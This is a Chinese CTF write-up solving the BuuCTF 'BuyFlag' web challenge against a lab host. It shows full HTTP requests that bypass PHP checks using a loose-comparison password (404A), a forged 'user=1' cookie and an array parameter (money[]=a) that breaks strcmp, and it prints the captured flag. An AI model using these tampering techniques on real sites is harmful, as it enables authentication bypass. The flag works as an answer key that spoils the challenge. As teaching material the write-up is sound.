---
tags:
  - BuuCTF
  - 简单
  - Http
---

# \[极客大挑战 2019\] BuyFlag

## 前置工作

进入靶机网页，主页没啥有用的，打开右上角 Menu，就能找到 PayFlag 选项，进入即可，此时 URL 为 `/pay.php`，可看到一些有效信息

![](https://p.sda1.dev/13/4f363ef9bae723d54d996280a2600548/image.png)

首先，我得是 CUIT 的学生（反正我不是），其次，我还得有正确的密码

这些都是空话，直接开 F12，往下翻，找到了一段被注释掉的代码，他让我把 `password` 和 `money` 通过 POST 传入，首先就得先把 `password` 的事情解决了

```php
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

## 绕过 `password` 判断

直接看有一行 `elseif ($password == 404)`，是个**弱比较**，那太好了，如果我的 `password` = `404A` 也是成立的，此时也正好可以绕过 `is_numeric()` 的判断，此时我的 Http 请求代码如下

```http
POST /pay.php HTTP/1.1
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
Connection: keep-alive
Cookie: user=0
Content-Length: 13

password=404A
```

## 成为 CUITer

一般而言我们 Http 请求的 Cookie 应该是没有的，但这个就很不巧，我注意到上面的 Http 请求 Cookie 中有一个 `user=0`，通常用户鉴权的时候读的也是 Cookie，所以我就把 `user` 改为 `1`，此时我的 Http 请求代码如下

```http
POST /pay.php HTTP/1.1
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
Connection: keep-alive
Cookie: user=1
Content-Length: 13

password=404A
```

看回显，已经快了

```
you are Cuiter
Password Right!
Pay for the flag!!!hacker!!!
```

## 给钱

现在我要做的就是付钱，怎么付？开头那段被注释掉的代码里就告诉我们，要把 `money` POST 进去，那我们就 POST 给他 100000000，请求如下

```http
POST /pay.php HTTP/1.1
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
Connection: keep-alive
Cookie: user=1
Content-Length: 13

password=404A
money=100000000
```

结果回显变成了

```
you are Cuiter
Password Right!
Nember lenth is too long
```

他提示我数字长度太长了，大概率是有个 `strcmp()` 函数在搞鬼，但是攻破这个函数的方法很简单，我只需要传入一个不正常的数据类型给他，他就会崩掉，比如数组，即我把 `money=100000000` 改成 `money[]=a`，再试一遍，此时的 Http 请求代码如下

```http
POST /pay.php HTTP/1.1
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
User-Agent: Apifox/1.0.0 (https://apifox.com)
Accept: */*
Host: d2712315-f104-498e-8257-4113e6f4986f.node4.buuoj.cn:81
Connection: keep-alive
Cookie: user=1
Content-Length: 13

password=404A
money[]=a
```

回显中就有了我想要的 Flag

```
you are Cuiter
Password Right!
flag{e7e247ff-8faa-4db2-81e5-ccd961cf7129}
```